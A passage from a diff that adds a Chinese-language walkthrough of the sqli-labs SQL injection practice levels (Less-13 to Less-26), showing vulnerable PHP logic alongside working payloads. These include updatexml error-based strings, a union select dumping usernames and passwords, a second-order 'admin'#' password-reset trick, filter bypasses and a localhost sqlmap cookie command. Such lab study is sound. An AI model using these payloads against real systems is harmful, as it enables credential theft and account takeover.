+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;不回显查询结果，除了union其他都可&lt;/p&gt;
+&lt;h2 id=&#34;less-14&#34;&gt;Less-14&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-双引号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;不回显查询结果，除了union其他都可&lt;/p&gt;
+&lt;h2 id=&#34;less-15&#34;&gt;Less-15&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单引号&lt;/td&gt;
+&lt;td&gt;bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;不回显查询结果，不报错&lt;/p&gt;
+&lt;h2 id=&#34;less-16&#34;&gt;Less-16&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-双引号+单括号&lt;/td&gt;
+&lt;td&gt;bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;不回显查询结果，不报错&lt;/p&gt;
+&lt;h2 id=&#34;less-17&#34;&gt;Less-17&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uname&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;  
+&lt;span class=&#34;nv&#34;&gt;$passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT username, password FROM users WHERE username= &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;语句有结果：&lt;/span&gt;
+	&lt;span class=&#34;nv&#34;&gt;$update&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UPDATE users SET password = &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$passwd&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; WHERE username=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysql报错：&lt;/span&gt;
+		 &lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单括号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;uname参数被过滤，只能考虑给一个正确的uname值进入分支，对update语句进行注入&lt;/p&gt;
+&lt;p&gt;无数据回显&lt;/p&gt;
+&lt;h2 id=&#34;less-18&#34;&gt;Less-18&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$uagent&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP_USER_AGENT&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$IP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$uname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uname&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$passwd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;passwd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT  users.username, users.password FROM users WHERE users.username=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and users.password=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$passwd&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; ORDER BY users.id DESC LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;语句有结果：&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$insert&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uagent&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$IP&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;, &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$uname&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;nx&#34;&gt;输出&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$uagent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+	&lt;span class=&#34;nx&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysql_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单括号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;该注入类型为insert注入，首先需要给一个正确的用户名、密码进入分析，对insert语句进行注入&lt;/p&gt;
+&lt;p&gt;insert注入必须要闭合后面语句&lt;/p&gt;
+&lt;p&gt;如下：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) and &#39;1&#39;=&#39;1
+&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&amp;quot;1&amp;quot;,&amp;quot;1&amp;quot;)--+
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less-19&#34;&gt;Less-19&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单括号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;类似18，注入点在referer头&lt;/p&gt;
+&lt;h2 id=&#34;less-20&#34;&gt;Less-20&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if cookie中没有uname参数：
+	输出登录信息;
+	if 提交uname和passwd：
+		$uname = check_input($_POST[&#39;uname&#39;]);
+        $passwd = check_input($_POST[&#39;passwd&#39;]);
+        $sql=&amp;quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&amp;quot;;
+        $cookee = $row1[&#39;username&#39;];
+        if 有返回结果:
+        	setcookie(&#39;uname&#39;, $cookee, time()+3600);
+        else:
+        	print_r(mysql_error());
+else:
+	if 没有提交submit参数：
+		$cookee = $_COOKIE[&#39;uname&#39;];
+		$sql=&amp;quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&amp;quot;;
+		if 没有返回结果:
+			输出 mysql_error();
+		if 有返回结果:
+			回显查询结果;
+	else:
+		setcookie(&#39;uname&#39;, $row1[&#39;username&#39;], time()-3600); //通过把失效日期设置为过去的日期/时间，删除一个 cookie
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单括号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;cookie中uname参数没有过滤，有数据回显、有报错&lt;/p&gt;
+&lt;h3 id=&#34;sqlmap-带cookie注入用法&#34;&gt;sqlmap 带cookie注入用法&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//UINION  其中 “-p 参数” 表示要测试的参数，这时--level失效；也可以使用&#39;*&#39;去标记参数
+sqlmap -u &amp;quot;http://127.0.0.1:8888/Less-20/&amp;quot; --cookie=&amp;quot;uname=admin&amp;quot; -p &amp;quot;cookie&amp;quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;less-21&#34;&gt;Less-21&lt;/h2&gt;
+&lt;p&gt;代码逻辑和Less-20类似，只不过获取set cookie时用了base64编码，获取cookie值时再解码拼入sql语句&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单括号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;less-22&#34;&gt;Less-22&lt;/h2&gt;
+&lt;p&gt;类似Less-21&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-双引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;less-23&#34;&gt;Less-23&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;//过滤了注释符
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$reg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/#/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$reg1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/--/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$replace&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$reg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$reg1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;过滤注释后，就需要闭合原始sql语句&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;UNION 注入使用from，在闭合原始语句时候需要引入where保证sql语句语法正确，例如：&lt;/p&gt;
+&lt;p&gt;-1&#39; union select 1,group_concat(username,&#39;:&#39;,password),3 from security.users where 1 and &amp;lsquo;1&amp;rsquo; = &amp;lsquo;1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;less-24二次注入&#34;&gt;Less-24(二次注入)&lt;/h2&gt;
+&lt;p&gt;login_create.php&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$username=  mysql_escape_string($_POST[&#39;username&#39;]) ;
+$pass= mysql_escape_string($_POST[&#39;password&#39;]);
+$re_pass= mysql_escape_string($_POST[&#39;re_password&#39;]);
+
+$sql = &amp;quot;select count(*) from users where username=&#39;$username&#39;&amp;quot;;
+if 查询结果不为0：
+	表明有用户存在，不可注册；
+else:
+	if 两次输入密码一致：
+		$sql = &amp;quot;insert into users ( username, password) values(\&amp;quot;$username\&amp;quot;, \&amp;quot;$pass\&amp;quot;)&amp;quot;;
+		重定向到登录页面；
+	else:
+		提示输入不一致；
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;login.php&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; $username = mysql_real_escape_string($_POST[&amp;quot;login_user&amp;quot;]);
+ $password = mysql_real_escape_string($_POST[&amp;quot;login_password&amp;quot;]);
+ $sql = &amp;quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&amp;quot;;
+ if 查询有结果：
+ 	$_SESSION[&amp;quot;username&amp;quot;] = 结果中的username值; //在session中设置username参数
+ 	重定向到已登录界面；
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pass_change.php&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if 未登录：
+	重定向到首页；
+
+$username= $_SESSION[&amp;quot;username&amp;quot;]; //从session中取出useranme值
+$curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);
+$pass= mysql_real_escape_string($_POST[&#39;password&#39;]);
+$re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);
+
+if 两次密码输入一致：
+	$sql = &amp;quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &amp;quot;;
+	if 执行成功：
+		输出成功更新密码；
+	else:
+		重定向到错误页面；
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;分析&#34;&gt;分析&lt;/h3&gt;
+&lt;p&gt;可看到基本上可进行直接注入的常规点都被转义过滤了，但是登录成功后，会从数据库中查询useranme值放入session；随后在pass_change页面更新密码语句存在注入点，且数据来源于从session取出来的值，也就是未过滤的值，因此存在二次注入&lt;/p&gt;
+&lt;h3 id=&#34;利用&#34;&gt;利用&lt;/h3&gt;
+&lt;p&gt;注册用户名为 admin’#&lt;/p&gt;
+&lt;p&gt;登录之后随意填入当前密码，再填入修改后的密码，提交即可任意修改admin用户密码&lt;/p&gt;
+&lt;h2 id=&#34;less-25&#34;&gt;Less-25&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/or/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    
+&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/AND/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;绕过&#34;&gt;绕过&lt;/h3&gt;
+&lt;p&gt;双写&lt;/p&gt;
+&lt;p&gt;or -&amp;gt; ||&lt;/p&gt;
+&lt;p&gt;and -&amp;gt; &amp;amp;&amp;amp;(get型中要url编码，否则歧义)&lt;/p&gt;
+&lt;h2 id=&#34;less-25a&#34;&gt;Less-25a&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;直接拼&lt;/td&gt;
+&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-25一致，拼接方式不同，不能报错&lt;/p&gt;
+&lt;h2 id=&#34;less-26&#34;&gt;Less-26&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/or/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;//strip out OR (non case sensitive)
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/and/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out AND (non case sensitive)
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\*]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//strip out /*
